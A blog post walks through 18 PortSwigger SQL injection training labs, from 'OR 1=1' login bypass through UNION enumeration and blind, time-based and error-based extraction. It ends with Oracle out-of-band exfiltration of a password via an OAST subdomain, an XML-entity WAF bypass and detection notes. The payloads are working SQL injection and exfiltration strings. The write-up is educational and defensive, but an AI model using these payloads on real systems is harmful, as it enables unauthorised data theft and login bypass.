---
layout: post
title: "18 SQL Injection Labs Later — A Practical Map from Tautologies to OOB Exfiltration"
date: 2026-06-07 09:30:00 +0800
categories: [web-security, methodology, detection-engineering]
tags: [sql-injection, portswigger, blind-sqli, oob-exfiltration, oracle, postgresql]
related_posts:
  - four-ways-llm-apps-turn-data-into-actions
  - picking-cves-detection-triage
---

I worked through the first 18 SQL injection labs in PortSwigger Web Security Academy as a single track rather than as isolated puzzles. That framing is useful because the labs form a clean progression: direct predicate control, UNION shape discovery, metadata enumeration, blind extraction, error-based extraction, time-based extraction, OOB interaction, and finally a WAF bypass through XML entity encoding.

The individual payloads matter, but the better takeaway is the decision tree: **what feedback channel do I have, and what database dialect am I probably speaking?**

## The ladder

The track breaks into seven capability levels:

| Stage | Feedback channel | Representative payload |
|---|---|---|
| WHERE bypass | Page content changes | `' OR 1=1--` |
| Login bypass | Auth state changes | `administrator'--` |
| UNION version | Visible query output | `NULL,banner FROM v$version` / `NULL,@@version` |
| Metadata enumeration | Visible query output | `information_schema` / `all_tables` |
| Blind boolean/error | Binary signal | `Welcome back!` / conditional error |
| Blind time | Latency | `pg_sleep()` |
| OOB | DNS/HTTP callback | Oracle XML external entity |

That table is the core mental model. SQL injection is not one technique. It is a family of ways to turn a database parser into an oracle.

For reference, here is the full track mapped to surface, channel, and payload:

| # | Lab | Surface | Channel | Core payload |
|---|-----|---------|---------|--------------|
| 1-2 | hidden data / login bypass | `category`, `username` | content, auth | `' OR 1=1--`, `administrator'--` |
| 3-6 | UNION column count / text column / other tables / single column | `category` | content | `UNION SELECT NULL,...`; `username\|\|'~'\|\|password` |
| 7-8 | MySQL/MSSQL version / Oracle version | `category` | content | `@@version`; `banner FROM v$version` |
| 9-10 | non-Oracle / Oracle contents | `category` | content | `information_schema.tables`; `all_tables` |
| 11-12 | blind conditional response / error | `TrackingId` cookie | boolean | `SUBSTRING(password,1,1)='j'`; `CASE WHEN … THEN TO_CHAR(1/0)` |
| 13-14 | time delay / time-delay extraction | `TrackingId` cookie | latency | `pg_sleep(10)`; conditional `pg_sleep` + binary search |
| 15 | visible error-based | `TrackingId` cookie | error | `1=CAST((SELECT password …) AS int)` |
| 16-17 | OOB interaction / exfiltration | `TrackingId` cookie | DNS/HTTP | `EXTRACTVALUE(xmltype('http://'\|\|password\|\|'.<oast>/'),'/l')` |
| 18 | XML encoding bypass | `storeId` (XML body) | content | full hex-entity-encoded `UNION SELECT` |

A decision tree compresses the whole track into one question — *what can I observe?*

```
Visible content?  → UNION (count → text column → concat)
Detailed error?   → error-based (CAST; short payload)
Conditional resp? → boolean blind
Stable timing?    → time-based (conditional sleep + binary search)
None of the above → OOB (EXTRACTVALUE/xmltype → OAST; subdomain exfil)
```

## Direct control: the easy wins

The first labs use the classic string-literal closure:

```text
' OR 1=1--
administrator'--
```

These are useful not because they are clever, but because they establish the invariant for the rest of the track: the attacker controls bytes that the database will parse as SQL syntax, not as data.

## UNION: shape before data

UNION exploitation has an order:

1. determine column count;
2. find which columns render text;
3. place data in visible columns;
4. concatenate if only one text column is available.

The syntax differences show up quickly:

```text
Oracle:      ' UNION SELECT NULL,banner FROM v$version--
MySQL/MSSQL: ' UNION SELECT NULL,@@version-- -
```

The Oracle labs also reinforce `FROM dual` and `all_tables/all_tab_columns`; the non-Oracle labs use `information_schema`.

## Blind extraction: optimize the oracle

The blind labs are where speed discipline matters. A naive time-based extraction can burn minutes per password. The practical approach is:

- calibrate false and true latency first;
- use binary search over ASCII when possible;
- add retry logic for transient SSL/gateway failures;
- re-check only suspicious positions with a longer delay.

In one lab, a 1-second sleep produced a plausible 20-character password but three characters were wrong due to jitter. A targeted 2-3 second recheck fixed the extraction. The lesson is not "always sleep longer"; it is "use cheap probes first, expensive probes only where uncertainty remains."

## Error-based extraction: payload length matters

The visible error-based lab had a subtle trap: the error message truncated long SQL. Including the original TrackingId before the payload pushed the password out of the visible portion. The fix was to replace the cookie value entirely with a short payload:

```text
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- 
```

The error became the output channel:

```text
invalid input syntax for type integer: "<password>"
```

## OOB: use the right collaborator

The OOB labs are operationally different. The payload can be correct and still appear to fail if the callback domain is not accepted or not observable. A public interactsh domain generated DNS/HTTP interactions in local self-tests but did not reliably solve the Academy OOB labs. A Burp/OAST domain did.

The interaction-only lab solved as soon as Oracle attempted to fetch the OAST URL. The exfiltration lab placed the administrator password in the leftmost subdomain:

```text
<password>.<oast-domain>
```

## XML encoding bypass

The final lab shows why WAFs are not a root fix. Plain SQL in the XML body was blocked:

```text
1 UNION SELECT username || '~' || password FROM users
```

Encoding the full string as XML hex entities bypassed the filter because the application decoded the XML before the database parsed the value:

```text
&#x31;&#x20;&#x55;&#x4e;...
```

The database still saw SQL syntax. The WAF saw entities.

## Defender notes

If I were writing detection for this track, I would not write one giant "SQLi regex." I would split by observable surface:

- query/path parameters containing `' OR`, `UNION SELECT`, `ORDER BY n--`;
- cookies containing SQL keywords, especially `TrackingId`-like analytics cookies;
- XML bodies containing encoded SQL keywords after entity decoding;
- database errors exposed to HTTP responses;
- abnormal database-originated DNS/HTTP traffic;
- time-delay functions such as `pg_sleep`, `WAITFOR DELAY`, `DBMS_LOCK.SLEEP`.

The detection source of truth should be the decoded application-layer value, not only raw bytes. The XML lab exists precisely because raw-byte inspection loses.

## Closing thought

The first 18 labs are a compact SQLi curriculum. The payloads are short, but the lesson is larger: exploitation speed comes from identifying the feedback channel. Once you know whether the application gives you content, auth state, errors, timing, or OOB callbacks, the rest is syntax.
